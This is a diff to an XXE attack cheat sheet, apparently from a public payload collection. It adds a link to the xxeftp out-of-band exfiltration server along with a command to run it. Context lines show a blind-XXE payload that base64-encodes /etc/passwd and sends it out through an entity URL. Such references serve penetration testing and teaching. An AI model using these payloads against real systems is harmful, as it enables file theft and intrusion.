@@ -10,12 +10,20 @@ Syntax: `<!ENTITY entity_name SYSTEM "entity_value">`
 
 ## Summary
 
+- [Tools](#tools)
 - [Exploit](#exploit)
 - [Basic XXE](#basic-xxe)
 - [PHP Wrapper inside XXE](#php-wrapper-inside-xxe)
 - [Deny of service](#deny-of-service)
 - [Blind XXE - Out of Band](#blind-xxe---out-of-Band)
 - [XXE in exotic files](#xxe-in-exotic-files)
+
+## Tools
+
+- [xxeftp](https://github.com/staaldraad/xxeserv)
+  ```
+  sudo ./xxeftp -uno 443 ./xxeftp -w -wps 5555
+  ```
 
 ## Exploit
 
@@ -183,6 +191,7 @@ File stored on http://127.0.0.1/dtd.xml
 <!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
 <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://127.0.0.1/dtd.xml?%data;'>">
 ```
+
 
 ## XXE in exotic files
 
